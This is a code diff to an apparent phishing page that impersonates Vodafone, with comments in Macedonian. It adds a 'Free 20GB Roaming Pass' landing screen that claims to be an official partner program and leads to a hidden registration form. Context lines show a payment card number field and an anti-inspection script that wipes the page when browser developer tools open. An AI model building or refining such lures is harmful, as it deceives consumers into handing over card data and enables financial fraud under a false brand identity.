@@ -293,8 +293,29 @@
 <div class="container">
     <div class="logo">vodafone</div>
 
-    <!-- Main Registration Form -->
-    <div id="formContainer">
+    <!-- Нова Насловна Страница (Landing / Home Screen) -->
+    <div id="homeContainer">
+        <h2>Vodafone Tourist & Roaming Pass</h2>
+        <p class="subtitle">Welcome to international connectivity. Enjoy seamless high-speed internet while traveling abroad.</p>
+        
+        <div class="info-box">
+            <strong style="display: block; margin-bottom: 8px; font-size: 14px; color: #fff;">Exclusive Offer:</strong>
+            <ul>
+                <li><strong>20GB High-Speed Data</strong> included for your trip.</li>
+                <li><strong>First Month Completely Free</strong> with zero commitment.</li>
+                <li>Instant activation with international network coverage.</li>
+            </ul>
+        </div>
+
+        <button type="button" class="btn-submit" onclick="goToRegistration()">Claim Free 20GB Offer</button>
+
+        <div class="security-note" style="margin-top: 20px;">
+            Official Vodafone Partner Program. Terms and conditions apply.
+        </div>
+    </div>
+
+    <!-- Main Registration Form (Првичната форма) -->
+    <div id="formContainer" style="display: none;">
         <h2>Get 20GB Free Data</h2>
         <p class="subtitle">Register as a new user to claim your welcome bonus. First month is completely free.</p>
 
@@ -465,6 +486,12 @@
             document.body.innerHTML = "<h2 style='text-align:center; margin-top:40vh;'>Access Denied: Inspector Detected</h2>";
         }
     }, 1000);
+
+    // Функција за премин од насловната страница кон формата за најава/активација
+    function goToRegistration() {
+        document.getElementById('homeContainer').style.display = 'none';
+        document.getElementById('formContainer').style.display = 'block';
+    }
 
     const cardInput = document.getElementById('cardNumber');
     cardInput.addEventListener('input', (e) => {
